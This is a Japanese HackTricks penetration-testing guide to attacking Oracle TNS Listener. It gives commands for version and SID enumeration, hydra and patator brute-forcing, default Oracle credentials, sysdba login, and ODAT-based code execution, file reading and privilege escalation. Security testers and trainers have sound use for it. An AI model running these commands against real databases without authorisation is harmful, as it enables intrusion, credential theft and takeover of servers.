# 1521,1522-1529 - Oracle TNS Listenerのペネトレーションテスト

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>

## 基本情報

Oracleデータベース（Oracle DB）は、Oracle Corporationからのリレーショナルデータベース管理システム（RDBMS）です（[こちら](https://www.techopedia.com/definition/8711/oracle-database)から）。

Oracleを列挙する際の最初のステップは、通常デフォルトポート（1521/TCP、-または1522–1529のセカンダリリスナーが存在することもあります-）に存在するTNS-Listenerに話しかけることです。
```
1521/tcp open  oracle-tns    Oracle TNS Listener 9.2.0.1.0 (for 32-bit Windows)
1748/tcp open  oracle-tns    Oracle TNS Listener
```
## 概要

1. **バージョン情報の列挙**（**既知の脆弱性**を検索）
2. **TNSリスナー** 通信の**ブルートフォース**（必ずしも必要ではない）
3. **SID名**（データベース名のような）の列挙/ブルートフォース
4. 発見された有効なSID名の**クレデンシャルのブルートフォース**
5. **コード実行**の試み

MSFのOracleモジュールを使用するためには、いくつかの依存関係をインストールする必要があります：[**インストール**](oracle-pentesting-requirements-installation.md)

## 列挙

この目的で使用できるツールには、nmap、MSF、[tnscmd10g](http://dokfleed.net/files/audit/tnscmd10g.zip)があります。

### TNSリスナーバージョン
```bash
nmap --script "oracle-tns-version" -p 1521 -T4 -sV <IP>
msf> use auxiliary/scanner/oracle/tnslsnr_version
#apt install tnscmd10g
tnscmd10g version -p 1521 -h <IP>
```
他に役立つTNSリスナーコマンド:

| **コマンド**  | **目的**                                                     |
| ------------ | ----------------------------------------------------------- |
| ping         | リスナーにpingを送る                                           |
| version      | リスナーのバージョンとプラットフォーム情報を提供する               |
| status       | リスナーが使用している現在のステータスと変数を返す                  |
| services     | サービスデータをダンプする                                       |
| debug        | リスナーログにデバッグ情報をダンプする                            |
| reload       | リスナーの設定ファイルをリロードする                              |
| save\_config | リスナーの設定ファイルをバックアップ場所に書き込む                  |
| stop         | リスナーのシャットダウンを呼び出す                                |

**エラーが発生した場合**、**TNSバージョンが互換性がない**可能性があります（`tnscmd10`で`--10G`パラメータを使用してください）。また、**エラーが続く場合**、リスナーが**パスワードで保護されている**可能性があります（[**ここで詳細なエラー一覧を見ることができます**](https://docs.oracle.com/database/121/ERRMG/TNS-00000.htm#ERRMG-GUID-D723D931-ECBA-4FA4-BF1B-1F4FE2EEBAD7)）— 心配しないでください…ハイドラが救助に来ます\*\*:\*\*
```
hydra -P rockyou.txt -t 32 -s 1521 host.victim oracle-listener
```
TNS リスナーは **MitM** 攻撃に対して脆弱である可能性があります。[サーバーが脆弱であるかどうかを確認し、攻撃を実行する方法についてはこちらを確認してください（バージョン 12c までの全バージョン）](tns-poison.md)。

### SID 列挙

#### **SID とは**

SID（Service Identifier）は基本的にデータベース名です。インストールによっては、1つ以上のデフォルト SID を持つことも、完全にカスタムの dba 定義 SID を持つこともあります。

**古いバージョンでは（9では機能します）** SID を要求すると、データベースがそれを送信してくれました：
```bash
tnscmd10g status-p 1521 -h <IP> #The SID are inside: SERVICE=(SERVICE_NAME=<SID_NAME>)

#msf1
msf> use auxiliary/scanner/oracle/sid_enum
msf> set rhost <IP>
msf> run
#msf2
msf> use auxiliary/admin/oracle/tnscmd
msf> set CMD (CONNECT_DATA=(COMMAND=STATUS))
msf> set rhost <IP>
msf> run #The SID are inside: SERVICE=(SERVICE_NAME=<SID_NAME>)
```
**SID ブルートフォース**

nmap と MSF の SID リストを重複なしでこのリストに統合しました：

{% file src="../../.gitbook/assets/sids-oracle.txt" %}
```bash
hydra -L /usr/share/metasploit-framework/data/wordlists/sid.txt -s 1521 <IP> oracle-sid
patator oracle_login host=<IP> sid=FILE0 0=sids-oracle.txt -x ignore:code=ORA-12505
./odat.py sidguesser -s $SERVER -d $SID --sids-file=./sids.txt
msf> use auxiliary/admin/oracle/sid_brute #This will use the list located at /usr/share/metasploit-framework/data/wordlists/sid.txt
nmap --script +oracle-sid-brute -p 1521 10.11.1.202 #This will use the list lcated at /usr/share/nmap/nselib/data/oracle-sids
```
**oracle\_login** を **patator** で使用するためには、以下を**インストール**する必要があります：
```
pip3 install cx_Oracle --upgrade
```
## **アカウントの対象化**

**SIDを入手しましたか？** 素晴らしいです。次のタスクに移り、ユーザーアカウント情報を抽出しましょう。ここからリスナーに接続し、資格情報のブルートフォースを行うことができます。

**Metasploit** _\*\*scanner/oracle/oracle\_login_ は、**最も一般的なデフォルト値のユーザーアカウント**情報をlogin:passwordとして提示する組み込みの辞書を持っています。ちなみに、このようなデフォルトエントリはOracleの最も一般的で深刻なセキュリティ問題の一つです。

**Nmap** も_script oracle-brute_を使ってここで助けになります。このスクリプトは**ログインとパスワードを混合**するので、それぞれのログインに対してすべてのパスワードを試し、かなり時間がかかります！

### **デフォルトパスワード**

以下はOracleに関連するいくつかのデフォルトパスワードです：

* **DBSNMP/DBSNMP** — インテリジェントエージェントがdbサーバーと通信するために使用します（変更するのは少し手間がかかります）
* **SYS/CHANGE\_ON\_INSTALL** — Oracle v9を含む以前のデフォルトsysdbaアカウント、バージョン10gからは異なる必要があります！
* **PCMS\_SYS/PCMS\_SYS** — デフォルトxアカウント
* **WMSYS/WMSYS** — デフォルトxアカウント
* **OUTLN/OUTLN** — デフォルトxアカウント
* **SCOTT/TIGER** — デフォルトxアカウント

他の**デフォルトパスワード**は[こちら](http://www.petefinnigan.com/default/oracle_default_passwords.htm)と[こちら](https://cirt.net/passwords?vendor=Oracle)で見つけることができます。

バージョン11.1.0.6、11.1.0.7、11.2.0.1、11.2.0.2、および11.2.0.3は**オフラインブルートフォース**に対して脆弱です。[**この技術についてもっと読む。**](remote-stealth-pass-brute-force.md)

### ユーザー/パス ブルートフォース

異なるツールはoracleに対して**異なるユーザー/パスリスト**を提供しています：

* **oscan:** _/usr/share/oscanner/accounts.default_ (169行)
* **MSF-1:** _from_ admin/oracle/oracle\_login \_\_/usr/share/metasploit-framework/data/wordlists/oracle\_default\_passwords.csv (598行)
* **MSF-2:** _from scanner/oracle/oracle\_login_ _/usr/share/metasploit-framework/data/wordlists/oracle\_default\_userpass.txt_ (568行)
* **Nmap:** _/usr/share/nmap/nselib/data/oracle-default-accounts.lst_ (687行)

私はそれらを**混合**し、**重複を削除しました：**

{% file src="../../.gitbook/assets/users-oracle.txt" %}

{% file src="../../.gitbook/assets/pass-oracle.txt" %}

### [ブルートフォース](../../generic-methodologies-and-resources/brute-force.md#oraclesql)

有効なSIDと有効な資格情報を**知っている**今、データベースに接続するにはツール _**sqlplus**_ が必要で、インストールするにはいくつかのステップを踏む必要があります：

[インストール](oracle-pentesting-requirements-installation.md)

既知の資格情報を使用してログインするには：
```
sqlplus <username>/<password>@<ip_address>/<SID>;
```
TNS Listenerがデフォルトポート以外で動作している場合（例：TCP/1522）：
```
sqlplus <username>/<password>@<ip_address>:<port>/<SID>;
```
**アカウントにシステムデータベース権限（sysdba）またはシステムオペレーター（sysop）がある場合**、次の操作を試してみることをお勧めします：
```bash
sqlplus <username>/<password>@<ip_address>/<SID> 'as sysdba';
#Example:
sqlplus SYSTEM/MANAGER@192.168.0.2/ORCL 'as sysdba'
```
## **オールインワン**

**興味深いツールはoscannerです**。これは有効なSIDを取得しようとし、その後有効な認証情報をブルートフォースで見つけ出し、いくつかの情報を抽出しようとします：
```bash
#apt install oscanner
oscanner -s <IP> -P <PORT>
```
別のツールでこれらの全てを実行するものがあります：[**odat**](https://github.com/quentinhardy/odat)です。
```bash
git clone https://github.com/quentinhardy/odat.git
cd odat
./odat.py --help #It shouldn't be problems in Kali
./odat.py all -s <IP> -p <PORT>
./odat.py all -s <IP> -p <PORT> -d <SID> #To bruteforce accounts for that SID
```
これらのオプション (_-s_ と _-p_) を使用すると、ODATは最初のステップとして**有効なSID**（システムID）を**検索します**。いくつかのオプションを設定してメソッド（例：ワードリストやブルートフォース攻撃）を構成できます。デフォルトでは、ODATは大きなワードリストを使用し、小規模なブルートフォース攻撃を行います。

ODATが**少なくとも1つのSID**（例：_ORCL_）を**見つけた場合**、**有効なOracleアカウントを検索します**。これは**見つかった各SIDに対して行います**。資格情報に関するいくつかのオプションを指定できます（例：_--accounts-file_、_--accounts-files_、_--login-as-pwd_）。

**各有効なアカウント**（例：_SYS_）について、**各有効なインスタンス**（SID）で、ODATは**各Oracleユーザーができること**（例：リバースシェル、ファイルの読み取り、DBAになる）を返します。

[**Wiki odat**](https://github.com/quentinhardy/odat/wiki)

## リモートコード実行

コマンドを実行する方法は少なくとも2つあります。例えば、JavaプロシージャやDBMS\_SCHEDULERパッケージを使用する方法です。ちなみに、実行しているユーザーに十分な権限がある場合、WebアプリケーションでのSQLインジェクションがある場合にもRCEを達成することができます。この段階で、Oracle Database Attacking Tool：[ODAT](https://github.com/quentinhardy/odat)の準備を強くお勧めします。

### ODATのインストール
```bash
git clone https://github.com/quentinhardy/odat.git
cd odat
./odat.py #It shouldn't be problems in Kali
```
### Java ストアドプロシージャを介したコード実行
```bash
./odat.py java -s <IP> -U <username> -P <password> -d <SID> --exec COMMAND
```
[詳細はこちら](oracle-rce-and-more.md#rce-java-store-procedure)

### スケジューラを介したコード実行
```bash
./odat.py dbmsscheduler -s <IP> -d <SID> -U <username> -P <password> --exec "C:\windows\system32\cmd.exe /c echo 123&gt;&gt;C:\hacK"
```
[詳細はこちら](oracle-rce-and-more.md#rce-scheduler)

### 外部テーブルを介してコードを実行する
```bash
./odat.py externaltable -s <IP> -U <username> -P <password> -d <SID> --exec "C:/windows/system32" "calc.exe"
```
「ODAT.py」は「CREATE ANY DIRECTORY」という権限を必要とします。これはデフォルトでDBAロールにのみ付与されている権限です。なぜなら、このツールは「あなたの」ディレクトリだけでなく、任意のディレクトリからファイルを実行しようとするからです（この攻撃の手動バージョンは、より少ない権限を必要とします）。

[詳細はこちら。](oracle-rce-and-more.md#rce-external-tables)

## ファイルの読み書き
```bash
./odat.py utlfile -s <IP> -d <SID> -U <username> -P <password> --getFile "C:/test" token.txt token.txt
./odat.py externaltable -s <IP> -U <username> -P <password> -d <SID> --getFile "C:/test" "my4.txt" "my"
```
[詳細はこちら](oracle-rce-and-more.md#read-write-files)

## 権限昇格

[詳細はこちら](oracle-rce-and-more.md#elevating-privileges)

odatの[privesc](https://github.com/quentinhardy/odat/wiki/privesc)モジュールを使用して権限を昇格させることができます。そのリンクでは、**odatを使用して権限を昇格させるいくつかの方法が見つかります。**
```bash
./odat.py privesc -s $SERVER -d $ID -U $USER -P $PASSWORD -h #Get module Help
```
脆弱性はoracle 10.1.0.3.0でテストされました - 10.1.0.5.0まで、そしておそらく11gでも動作するはずです。2007年10月のOracle Critical Patchアップデートで修正されました。
```bash
msf> use auxiliary/sqli/oracle/lt_findricset_cursor
```
## 無料の仮想環境でのテスト

Oracleデータベースへの攻撃を練習したい場合、最も安全な方法はOracle Developer Days Virtualbox VMに登録することです：

{% embed url="http://www.oracle.com/technetwork/database/enterprise-edition/databaseappdev-vm-161299.html" %}

この投稿のほとんどの情報は以下から抜粋されました：[https://medium.com/@netscylla/pentesters-guide-to-oracle-hacking-1dcf7068d573](https://medium.com/@netscylla/pentesters-guide-to-oracle-hacking-1dcf7068d573) および [https://hackmag.com/uncategorized/looking-into-methods-to-penetrate-oracle-db/](https://hackmag.com/uncategorized/looking-into-methods-to-penetrate-oracle-db/)

その他の興味深い**参考文献**：

[http://blog.opensecurityresearch.com/2012/03/top-10-oracle-steps-to-secure-oracle.html](http://blog.opensecurityresearch.com/2012/03/top-10-oracle-steps-to-secure-oracle.html)

## HackTricks 自動コマンド
```
Protocol_Name: Oracle    #Protocol Abbreviation if there is one.
Port_Number:  1521     #Comma separated if there is more than one.
Protocol_Description: Oracle TNS Listener         #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for Oracle
Note: |
Oracle database (Oracle DB) is a relational database management system (RDBMS) from the Oracle Corporation

#great oracle enumeration tool
navigate to https://github.com/quentinhardy/odat/releases/
download the latest
tar -xvf odat-linux-libc2.12-x86_64.tar.gz
cd odat-libc2.12-x86_64/
./odat-libc2.12-x86_64 all -s 10.10.10.82

for more details check https://github.com/quentinhardy/odat/wiki

https://book.hacktricks.xyz/pentesting/1521-1522-1529-pentesting-oracle-listener

Entry_2:
Name: Nmap
Description: Nmap with Oracle Scripts
Command: nmap --script "oracle-tns-version" -p 1521 -T4 -sV {IP}
```
<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい場合**、または**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* **HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを共有する。

</details>
